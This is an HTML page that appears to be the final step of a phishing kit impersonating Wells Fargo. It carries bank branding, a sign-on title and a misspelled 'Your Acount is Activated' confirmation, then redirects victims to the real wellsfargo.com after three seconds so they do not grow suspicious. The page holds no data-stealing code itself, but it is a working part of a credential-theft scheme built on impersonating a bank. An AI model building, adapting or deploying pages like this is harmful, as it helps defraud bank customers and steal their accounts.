<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Wells Fargo&nbsp;Sign On to View Your Accounts</title>
<link rel="shortcut icon" link rel="logo-icon" href="img/favicon.ico">
<meta http-equiv='refresh' content='3;URL=https://www.wellsfargo.com/'/>
<link rel="stylesheet" type="text/css" href="css/zebi.css"/>
<style>
body {
    background-color: #44464a;
    font-size: 100%;
    margin: 0;
}
a, a:link, a:visited {
    color: white;
}
.primary{
	background: url(img/btn_blueslice.gif) repeat-x scroll left top transparent;
    border: 1px solid #e0e3e2;
    font-weight: bold;
    margin: 7px 10px 8px 4px;
    padding: 2px 10px;
    color: white;
    float: right;
}
.icon-bar{
display: block;
width: 28px;
height: 4px;
border-bottom: 4px solid #ae1e23;
border-radius: 1px;
background-color: white;
}
</style>
</head>
<body>
<div style="height: 42px;position: fixed;top: 0;left: 0;right: 0;transition: all .5s ease-in-out;z-index: 1030;background-color: #ae1e23;overflow: hidden;width: auto;">
<center>
<table style="width: 300px;padding: 3px;">
<tr>
<td><img src="img/tgo.svg"/></td>
<td><center><img src='img/logo.png'/></center></td>
<td>
<span class="icon-bar">&zwj;</span>
<span class="icon-bar">&zwj;</span>
<span class="icon-bar">&zwj;</span>
</td>
</tr>
</table>
</center>
</div>
<br>
<br>
<div class="overlaySignOn" style="top: 42px;background-color:#f1f1f1;" aria-hidden="false">
<center><table style="border: 0px solid #5181b2;width: auto;text-align: center;border-top: 0px;padding: 16px;">
<tr><td><br></td></tr>
<tr><td><br></td></tr>
<tr><td><br></td></tr>
<tr>
<td><center><font size="4" style="
    color: lime;
    font-family: sans-serif;
"><b>We Thank You, Your Acount is Activated</b></font></center></td>
</tr>
<tr>
<td><center><img src="img/fin.png"/></center></td>
</tr>
<tr><td><br></td></tr>
<tr><td><br></td></tr>
</table></center>
		</div>
</body>
</html>
